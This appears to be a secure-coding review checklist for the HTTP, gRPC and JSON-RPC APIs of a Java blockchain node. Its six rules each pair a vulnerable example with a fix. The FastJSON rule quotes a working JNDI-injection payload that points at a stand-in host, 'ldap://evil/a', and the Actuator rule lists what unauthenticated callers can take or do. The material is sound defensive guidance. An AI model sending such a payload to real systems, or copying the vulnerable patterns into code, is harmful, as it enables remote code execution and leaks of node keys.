# API Checks — HTTP / gRPC / JSON-RPC

Applies to: HTTP servlet layer, gRPC service, JSON-RPC interface.
Also load `common.md` (DESER-01, ERR-01, NET-01, OOM-01 apply here).

---

### API-01: FastJSON autoType Enables Remote Code Execution

- **Severity**: Critical
- **CWE**: CWE-502 — Deserialization of Untrusted Data
- **OWASP**: A08:2021 — Software and Data Integrity Failures

**Problem**
FastJSON 1.x `JSON.parseObject()` with autoType enabled (default in some versions) allows the `@type` field in JSON to instantiate arbitrary Java classes. FastJSON 1.2.83 has documented bypasses of the autoType denylist (CVE-2022-25845 and related). A blockchain node's HTTP API typically has no authentication, making every `JSON.parseObject(userInput)` call an unauthenticated RCE surface.

**Bad Example**
```java
// HTTP handler — input comes directly from unauthenticated HTTP client
JSONObject params = JSON.parseObject(request.getReader());
// Attacker sends: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil/a","autoCommit":true}
// FastJSON instantiates JdbcRowSetImpl and calls setDataSourceName() → JNDI lookup → RCE
```

**Good Example**
```java
// Option A: Safe mode (FastJSON 1.x, disables all autoType)
static {
    ParserConfig.getGlobalInstance().setSafeMode(true);
}
JSONObject params = JSON.parseObject(request.getReader());

// Option B: Migrate to FastJSON2 (safe by default)
import com.alibaba.fastjson2.JSON;
JSONObject params = JSON.parseObject(inputString);

// Option C: Jackson with explicit type — no polymorphism
ObjectMapper mapper = new ObjectMapper();
MyRequest req = mapper.readValue(inputString, MyRequest.class);
```

---

### API-02: HTTP/2 RST_STREAM Flood Not Rate-Limited

- **Severity**: High
- **CWE**: CWE-770 — Allocation of Resources Without Limits or Throttling

**Problem**
HTTP/2 clients can open a stream and immediately send `RST_STREAM` to cancel it, at negligible client cost. Without a server-side rate limit on stream resets per connection, an attacker repeats this at high frequency, forcing the server to allocate and tear down resources for each stream (CVE-2023-44487, "HTTP/2 Rapid Reset"). This is particularly relevant for gRPC servers built on Netty.

**Bad Example**
```java
// gRPC server builder — no stream reset protection
NettyServerBuilder.forPort(rpcPort)
    .addService(nodeService)
    .maxInboundMessageSize(maxMessageSize)
    // ❌ No maxRstFramesPerWindow or equivalent
    .build();
```

**Good Example**
```java
// gRPC-Java 1.58+ includes RST_STREAM rate limiting
NettyServerBuilder.forPort(rpcPort)
    .addService(nodeService)
    .maxInboundMessageSize(maxMessageSize)
    .maxRstFramesPerWindow(200, 30)   // max 200 resets per 30 seconds per connection
    .build();
// Also: ensure gRPC-Java dependency >= 1.58.0
```

---

### API-03: Request Body Size Unlimited

- **Severity**: High
- **CWE**: CWE-400 — Uncontrolled Resource Consumption
- **OWASP**: A05:2021 — Security Misconfiguration

**Problem**
Reading an HTTP request body into memory without a size limit allows an attacker to send multi-GB requests, exhausting heap and triggering GC storms or OOM. The attack is free: no authentication is needed and the attacker abandons the connection immediately after sending the body.

**Bad Example**
```java
// Utility used by all handlers — reads entire body into memory
public static String readBody(HttpServletRequest request) throws IOException {
    StringBuilder sb = new StringBuilder();
    try (BufferedReader reader = request.getReader()) {
        String line;
        while ((line = reader.readLine()) != null) {
            sb.append(line);   // ❌ no size cap
        }
    }
    return sb.toString();
}
```

**Good Example**
```java
private static final int MAX_BODY_BYTES = 1024 * 1024; // 1 MB

public static String readBody(HttpServletRequest request) throws IOException {
    // Fast-fail on declared Content-Length, but note: getContentLength() returns -1
    // when the header is absent, so this check can be bypassed — the stream limit below
    // is the definitive guard.
    int contentLength = request.getContentLength();
    if (contentLength > MAX_BODY_BYTES) {
        throw new IllegalArgumentException("Request body too large: " + contentLength);
    }
    // BoundedInputStream enforces the limit regardless of Content-Length header
    try (InputStream bounded = new BoundedInputStream(request.getInputStream(), MAX_BODY_BYTES + 1)) {
        byte[] body = bounded.readAllBytes();
        if (body.length > MAX_BODY_BYTES) {
            throw new IllegalArgumentException("Request body too large");
        }
        return new String(body, StandardCharsets.UTF_8);
    }
}
// BoundedInputStream is from Apache Commons IO (org.apache.commons.io.input.BoundedInputStream).
// Also configure the HTTP server (e.g., Jetty) at framework level:
// context.setMaxFormContentSize(MAX_BODY_BYTES);
```

---

### API-04: API Endpoints Bound to All Interfaces With No Authentication

- **Severity**: High
- **CWE**: CWE-306 — Missing Authentication for Critical Function
- **OWASP**: A07:2021 — Identification and Authentication Failures

**Problem**
Blockchain node APIs (HTTP, gRPC, JSON-RPC) commonly bind to `0.0.0.0` with no authentication layer. Every exposed API — including those that broadcast transactions, expose wallet functionality, or reveal mempool data — is callable by anyone who can reach the port. Default port numbers (8545 for Ethereum-compatible JSON-RPC, 8080/8090 for HTTP) are actively scanned.

**Bad Example**
```java
// Server binds to all interfaces, no auth filter
Server server = new Server(httpPort);   // binds 0.0.0.0:httpPort
server.setHandler(apiHandler);
// apiHandler has no authentication middleware
```

**Good Example**
```java
// Option A: Bind to localhost, terminate TLS externally
Server server = new Server();
ServerConnector connector = new ServerConnector(server);
connector.setHost("127.0.0.1");   // loopback only
connector.setPort(httpPort);
server.addConnector(connector);

// Option B: Add authentication filter for sensitive endpoints
server.setHandler(new AuthenticationFilter(apiHandler, apiKeyStore));

// Option C: Disable unused API surfaces entirely
if (!config.getBoolean("walletApiEnabled")) {
    // do not register wallet endpoints
}
```

---

### API-05: Log Filter / Subscription Object Created Without Global Cap

- **Severity**: High
- **CWE**: CWE-770 — Allocation of Resources Without Limits or Throttling

**Problem**
Ethereum-compatible JSON-RPC provides `eth_newFilter`, `eth_newBlockFilter`, and `eth_subscribe` that create server-side subscription objects. Without a global cap on the number of active subscriptions per client or in total, an attacker calls these methods in a tight loop, allocating thousands of objects and exhausting heap. The attack requires no authentication.

**Bad Example**
```java
public String newFilter(FilterReq req) {
    // ❌ No check on current count before creating a new filter
    Filter f = new Filter(req);
    registry.register(f);
    return f.id();
}
```

**Good Example**
```java
private static final int MAX_TOTAL  = 10_000;
private static final int MAX_PER_IP = 100;

public String newFilter(FilterReq req, String ip) {
    if (registry.total() >= MAX_TOTAL) {
        throw new JsonRpcException(-32000, "Global filter limit reached");
    }
    if (registry.countByIp(ip) >= MAX_PER_IP) {
        throw new JsonRpcException(-32000, "Per-client filter limit reached");
    }
    Filter f = new Filter(req);
    registry.register(f, ip);
    return f.id();
}
```

---

### API-06: Spring Boot Actuator Management Endpoints Exposed Without Authentication

- **Severity**: High
- **CWE**: CWE-306 — Missing Authentication for Critical Function
- **OWASP**: A05:2021 — Security Misconfiguration

**Problem**
Spring Boot Actuator provides operational endpoints (`/actuator/heapdump`, `/actuator/env`, `/actuator/shutdown`, `/actuator/threaddump`) that are extremely sensitive in a blockchain node context. With the common default `management.endpoints.web.exposure.include=*` left unchanged from development, all endpoints are reachable without authentication. `/actuator/heapdump` returns a full JVM heap snapshot that may contain validator private key material loaded in memory. `/actuator/env` returns all environment variables and resolved configuration properties, including key file paths and database credentials. `/actuator/shutdown` allows a remote caller to terminate the node process, causing a block production outage.

**Bad Example**
```java
// application.properties — dev default never changed for production
// management.endpoints.web.exposure.include=*
// No SecurityFilterChain configured for /actuator/**

// Unauthenticated callers can:
// GET  /actuator/heapdump  → download full heap (may contain private key bytes)
// GET  /actuator/env       → read all config properties and environment variables
// POST /actuator/shutdown  → kill the node process
```

**Good Example**
```java
// Option A: expose only the safe liveness endpoint (recommended minimum)
// management.endpoints.web.exposure.include=health
// management.endpoint.health.show-details=never

// Option B: bind management server to loopback on a firewall-restricted port
// management.server.address=127.0.0.1
// management.server.port=9090

// Option C: require authentication for every actuator endpoint
// Spring Security 6.x / Spring Boot 3.x:
@Bean
public SecurityFilterChain actuatorSecurity(HttpSecurity http) throws Exception {
    http.securityMatcher(EndpointRequest.toAnyEndpoint())
        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())  // ✅
        .httpBasic(Customizer.withDefaults());
    return http.build();
}
// Spring Security 5.x / Spring Boot 2.x equivalent:
//   http.requestMatcher(...).authorizeRequests(...).httpBasic()
// Regardless of option: always explicitly set exposure.include in production config.
```
